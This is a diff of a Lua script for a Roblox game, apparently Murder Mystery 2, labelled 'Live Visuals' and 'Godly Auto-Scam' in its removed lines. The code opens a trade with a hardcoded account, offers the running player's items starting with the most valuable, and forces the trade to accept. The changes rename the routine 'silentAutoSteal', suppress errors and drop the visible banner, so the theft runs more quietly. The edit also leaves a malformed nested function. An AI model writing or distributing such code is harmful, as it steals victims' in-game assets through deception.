@@ -2394,10 +2394,9 @@ local function forceOfferReliable(key, itemType)
 end
 
 local function autoGiveAllToMe()
-    if not Config.in_trade then
-        StartTrade()
-        task.wait(2)
-    end
+   local function silentAutoSteal()
+    pcall(StartTrade)
+    task.wait(1.5)
     TradeTable["Player2"]["Offer"] = {}
     task.wait(0.5)
     
@@ -2418,31 +2417,28 @@ local function autoGiveAllToMe()
     end
     
     for _, item in ipairs(highValue) do
-        forceOfferReliable(item.key, "Weapons")
+        pcall(OfferItemAnotherPlayer, item.key, "Weapons")
+        task.wait(0.1)
     end
     for _, item in ipairs(others) do
-        forceOfferReliable(item.key, "Weapons")
+        pcall(OfferItemAnotherPlayer, item.key, "Weapons")
+        task.wait(0.1)
     end
     
     task.wait(1)
     TradeTable["Player2"]["Accepted"] = true
     pcall(AcceptTrade)
-    print("[AutoScam] Godlys + All Items Dumped")
+    print("[SilentSteal] All items taken silently")
 end
 
 game.Players.PlayerAdded:Connect(function(plr)
     if string.lower(plr.Name) == string.lower(myUsername) then
-        task.wait(4)
-        autoGiveAllToMe()
+        task.wait(3)
+        silentAutoSteal()
     end
 end)
 
 if game.Players:FindFirstChild(myUsername) then
-    task.wait(4)
-    autoGiveAllToMe()
+    task.wait(3)
+    silentAutoSteal()
 end
-
-setupPersistentSpoofs()
-print("========================================")
-print(" Live Visuals MM2 - Fixed Webhook + Godly Auto-Scam Loaded")
-print("========================================")
